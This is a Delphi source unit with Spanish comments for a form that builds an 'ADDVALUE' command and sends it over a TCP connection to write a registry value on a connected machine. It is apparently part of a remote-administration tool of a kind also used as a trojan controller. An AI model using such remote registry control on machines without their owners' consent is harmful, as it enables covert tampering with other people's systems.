unit UnitFormReg;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Buttons, IdTCPServer;

type
  TFormReg = class(TForm)
    LabelNombre: TLabel;
    EditNombreValor: TEdit;
    LabelInformacion: TLabel;
    MemoInformacionValor: TMemo;
    BtnAceptar:  TSpeedButton;
    BtnCancelar: TSpeedButton;
    procedure BtnCancelarClick(Sender: TObject);
    procedure BtnAceptarClick(Sender: TObject);
    procedure MemoInformacionValorKeyPress(Sender: TObject; var Key: char);
  private
    Servidor:   TIdPeerThread;
    Ruta, Tipo: string;
    procedure CerrarVentana();
    { Private declarations }
  public
    constructor Create(aOwner: TComponent; Socket: TIdPeerThread;
      RegistroRuta, RegistroTipo: string);
    { Public declarations }
  end;

var
  FormReg: TFormReg;

implementation

uses UnitMain;

{$R *.dfm}

constructor TFormReg.Create(aOwner: TComponent; Socket: TIdPeerThread;
  RegistroRuta, RegistroTipo: string);
begin
  inherited Create(aOwner);
  Servidor := Socket;
  Ruta     := RegistroRuta;
  Tipo     := RegistroTipo;
  Caption  := 'Añadiendo valor ' + Tipo;
end;

procedure TFormReg.CerrarVentana();
begin
  //Deja todo como estaba
  EditNombreValor.Text      := '';
  EditNombreValor.Enabled   := True;
  MemoInformacionValor.Text := '';
  MemoInformacionValor.Enabled := True;
  Close;
end;

procedure TFormReg.BtnCancelarClick(Sender: TObject);
begin
  CerrarVentana();
end;

procedure TFormReg.BtnAceptarClick(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    Servidor.Connection.WriteLn('ADDVALUE|' + Ruta + EditNombreValor.Text +
      '|' + Tipo + '|' + MemoInformacionValor.Text);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
  CerrarVentana();
end;

procedure TFormReg.MemoInformacionValorKeyPress(Sender: TObject; var Key: char);
begin
  if (Tipo = 'REG_SZ') or (Tipo = 'REG_EXPAND_SZ') then
    if (key = #10) or (key = #13) then
    begin
      MessageDlg('Los valores binarios solo constan de una linea', mtWarning, [mbOK], 0);
      Key := #0;
      MessageBeep($FFFFFFFF);
    end;
  if Tipo = 'REG_BINARY' then
    //Si es un valor binario solo deja introducir valores hexadeciamles y espacios
    if not (key in ['0'..'9', 'A'..'F', 'a'..'f', ' ', #8]) then
      //#8 es el backspace, borrar
    begin
      key := #0;
      MessageBeep($FFFFFFFF);
    end;
  if Tipo = 'REG_DWORD' then  //Si es un valor binario solo deja introducir números
    if not (key in ['0'..'9', #8]) then
    begin
      key := #0;
      MessageBeep($FFFFFFFF);
    end;
end;

end.
